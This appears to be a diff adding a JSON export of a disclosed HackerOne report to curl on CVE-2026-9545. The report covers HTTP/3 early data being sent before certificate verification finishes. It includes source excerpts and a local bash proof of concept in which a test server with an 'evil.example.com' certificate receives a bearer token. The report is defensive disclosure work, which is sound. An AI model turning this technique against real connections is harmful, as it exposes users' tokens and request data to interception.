@@ -1,0 +1,113 @@
+{
+  "id": 3752888,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzUyODg4",
+  "url": "https://hackerone.com/reports/3752888",
+  "title": "CVE-2026-9545: exposing HTTP/3 early data",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-21T10:57:57.074Z",
+  "submitted_at": "2026-05-21T10:58:01.538Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hahahkim",
+    "url": "/hahahkim",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-9545"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T06:24:17.278Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:15:07.337Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nWhen the ngtcp2 HTTP/3 backend reuses a TLS session that advertises early data support, `cf_ngtcp2_on_session_reuse()` initializes the HTTP/3 connection state and marks the connection filter as connected before the new QUIC/TLS handshake has completed. The request send path can then reach `cf_ngtcp2_send()` while peer verification for the new connection is still pending. `cf_ngtcp2_send()` checks `ctx->tls_vrfy_result` only at function entry, then can process ingress, open an HTTP/3 stream, buffer request bytes, and flush egress without requiring that the peer has already been verified.\n\n- `cf_ngtcp2_send()`: the ngtcp2 send path rejects only a preexisting verification error. It does not require `ctx->tls_handshake_complete` or a successful peer verification before opening an HTTP/3 stream, buffering request bytes, or flushing egress.\n\n  ```c\n  /* handshake verification failed in callback, do not send anything */\n  if(ctx->tls_vrfy_result) {\n    result = ctx->tls_vrfy_result;\n    goto denied;\n  }\n\n  (void)eos; /* use for stream EOF and block handling */\n  result = cf_progress_ingress(cf, data, &pktx);\n  if(result)\n    goto out;\n\n  if(!stream || stream->id < 0) {\n    result = h3_stream_open(cf, data, buf, len, pnwritten);\n  }\n  ...\n  result = Curl_bufq_write(&stream->sendbuf, buf, len, pnwritten);\n  ...\n  if(*pnwritten > 0 && !ctx->tls_handshake_complete && ctx->use_earlydata)\n    ctx->earlydata_skip += *pnwritten;\n\n  DEBUGASSERT(!result);\n  result = cf_progress_egress(cf, data, &pktx);\n  ```\n\n  https://github.com/curl/curl/blob/f2692b54f74b8bb6058ecd3cf4abcc96e8ab36ba/lib/vquic/curl_ngtcp2.c#L1732-L1824\n\n## Affected version\ncurl 8.21.0-DEV\n\n## Steps To Reproduce:\n\n### Environment\n```bash\ncurl commit: f2692b54f74b8bb6058ecd3cf4abcc96e8ab36ba\ncurl subject: docs: note CURLOPT_PINNEDPUBLICKEY has no effect on legacy LDAP backend\n\ncurl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV quictls/3.1.7 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 nghttp2/1.59.0 ngtcp2/1.8.1 nghttp3/1.6.0\nFeatures: alt-svc AsynchDNS brotli Debug HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Largefile libz PSL SSL SSLS-EXPORT threadsafe TLS-SRP UnixSockets zstd\n```\n\n### PoC script\nThe PoC below performs one valid HTTP/3 request to cache an H3 TLS session, restarts the server with a distinct ticket key and an `evil.example.com` certificate, then performs a second request to `https://target.example.com:4433/`.\n\n```bash\n#!/bin/bash\nset -euo pipefail\n\nexport LD_LIBRARY_PATH=\"/src/curl-b96/build_poc/lib:/opt/quictls/lib:/opt/ngtcp2/lib:/opt/nghttp3/lib\"\nexport PATH=\"/opt/ngtcp2/bin:$PATH\"\n\ntmp=$(mktemp -d)\ncurl_bin=/src/curl-b96/build_poc/src/curl\nserver=/opt/ngtcp2/bin/qtlsserver\nurl=https://target.example.com:4433/index.html\nconnect_to=target.example.com:4433:127.0.0.1:4433\nsecret=REQUEST_SECRET_b96a057fce65e346\nserver_pid=\n\ncleanup() {\n  if [ -n \"${server_pid:-}\" ]; then\n    kill \"$server_pid\" >/dev/null 2>&1 || true\n    wait \"$server_pid\" >/dev/null 2>&1 || true\n  fi\n  rm -rf \"$tmp\"\n}\ntrap cleanup EXIT\n\nmake_certs() {\n  openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \\\n    -keyout \"$tmp/ca-key.pem\" -out \"$tmp/ca.pem\" \\\n    -days 1 -nodes -subj \"/CN=PoC Test CA\" >/dev/null 2>&1\n\n  printf 'subjectAltName=DNS:target.example.com\\n' > \"$tmp/good.ext\"\n  openssl req -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \\\n    -keyout \"$tmp/good-key.pem\" -out \"$tmp/good.csr\" \\\n    -nodes -subj \"/CN=target.example.com\" >/dev/null 2>&1\n  openssl x509 -req -in \"$tmp/good.csr\" -CA \"$tmp/ca.pem\" -CAkey \"$tmp/ca-key.pem\" \\\n    -CAcreateserial -out \"$tmp/good-cert.pem\" -days 1 -extfile \"$tmp/good.ext\" >/dev/null 2>&1\n\n  printf 'subjectAltName=DNS:evil.example.com\\n' > \"$tmp/evil.ext\"\n  openssl req -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \\\n    -keyout \"$tmp/evil-key.pem\" -out \"$tmp/evil.csr\" \\\n    -nodes -subj \"/CN=evil.example.com\" >/dev/null 2>&1\n  openssl x509 -req -in \"$tmp/evil.csr\" -CA \"$tmp/ca.pem\" -CAkey \"$tmp/ca-key.pem\" \\\n    -CAcreateserial -out \"$tmp/evil-cert.pem\" -days 1 -extfile \"$tmp/evil.ext\" >/dev/null 2>&1\n}\n\nstart_server() {\n  local cert=$1 ticket=$2 docroot=$3 log=$4\n  mkdir -p \"$docroot\"\n  printf '%s\\n' \"$cert response\" > \"$docroot/index.html\"\n  env TICKET_KEY_FILE=\"$ticket\" \"$server\" --early-response -d \"$docroot\" '*' 4433 \\\n    \"$tmp/$cert-key.pem\" \"$tmp/$cert-cert.pem\" > \"$log\" 2>&1 &\n  server_pid=$!\n  sleep 1\n}\n\nstop_server() {\n  kill \"$server_pid\" >/dev/null 2>&1 || true\n  wait \"$server_pid\" >/dev/null 2>&1 || true\n  server_pid=\n}\n\nmake_certs\nhead -c 80 /dev/urandom > \"$tmp/good.ticket\"\nhead -c 80 /dev/urandom > \"$tmp/evil.ticket\"\n\nstart_server good \"$tmp/good.ticket\" \"$tmp/good-root\" \"$tmp/good-server.log\"\n\"$curl_bin\" --http3-only --tls-earlydata \\\n  --ssl-sessions \"$tmp/sessions.txt\" \\\n  --cacert \"$tmp/ca.pem\" \\\n  --connect-to \"$connect_to\" \\\n  -sS -o /dev/null \"$url\"\nstop_server\n\nstart_server evil \"$tmp/evil.ticket\" \"$tmp/evil-root\" \"$tmp/evil-server.log\"\nset +e\n\"$curl_bin\" --http3-only --tls-earlydata \\\n  --ssl-sessions \"$tmp/sessions.txt\" \\\n  --cacert \"$tmp/ca.pem\" \\\n  --connect-to \"$connect_to\" \\\n  -H \"Authorization: Bearer $secret\" \\\n  -d \"secret=$secret\" \\\n  -sS -o /dev/null \"$url\" > \"$tmp/evil-client.log\" 2>&1\nphase2_rc=$?\nset -e\nstop_server\n\nrequest_seen=no\nverify_failed=no\nif grep -qi \"authorization: Bearer $secret\" \"$tmp/evil-server.log\"; then\n  request_seen=yes\nfi\nif [ \"$phase2_rc\" -eq 60 ] &&\n   grep -q \"no alternative certificate subject name matches target hostname 'target.example.com'\" \"$tmp/evil-client.log\"; then\n  verify_failed=yes\nfi\n\ngrep -i \"authorization: Bearer $secret\" \"$tmp/evil-server.log\" | head -1 || true\ngrep \"no alternative certificate subject name matches target hostname 'target.example.com'\" \"$tmp/evil-client.log\" | head -1 || true\necho \"TEST_RESULT request_seen=$request_seen verify_failed=$verify_failed curl_exit=$phase2_rc\"\n\ntest \"$request_seen\" = yes\ntest \"$verify_failed\" = yes\n```\n\n#### Output\n\n```text\nhttp: stream 0x0 [authorization: Bearer REQUEST_SECRET_b96a057fce65e346]\ncurl: (60) SSL: no alternative certificate subject name matches target hostname 'target.example.com'\nTEST_RESULT request_seen=yes verify_failed=yes curl_exit=60\n```\n\n## Again: there is no bug-bounty for curl. We do not offer any rewards, only proper credits.\n\nThe initial discovery was made by AI. All technical claims have been reviewed and revised by human experts.\n\nReporting on behalf of Autonomous Code Security (ACS) team at Microsoft.\n\n## Impact\n\n## Summary:\nA MITM attacker can see the data of the request sent as early data.\n\nExpected to be moderate for affected configurations, with narrow prerequisites.\nTriggering the issue requires all of the following:\n1. curl/libcurl is built with the ngtcp2 HTTP/3 backend and a TLS backend that supports early data.\n2. The application enables early data for the transfer.\n3. The client has a cached H3 TLS session for the target host that allows early data.\n4. The first request on the new connection contains sensitive request material such as cookies, bearer tokens, or a request body.\n5. An active network attacker can route the new connection to a TLS endpoint that does not validate for the target hostname.\n6. Certificate verification remains enabled.\n\nThe demonstrated impact is request disclosure. The PoC does not demonstrate attacker response acceptance: curl returns certificate verification failure and no response body is delivered.",
+  "weakness": {
+    "id": 28,
+    "name": "Improper Certificate Validation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
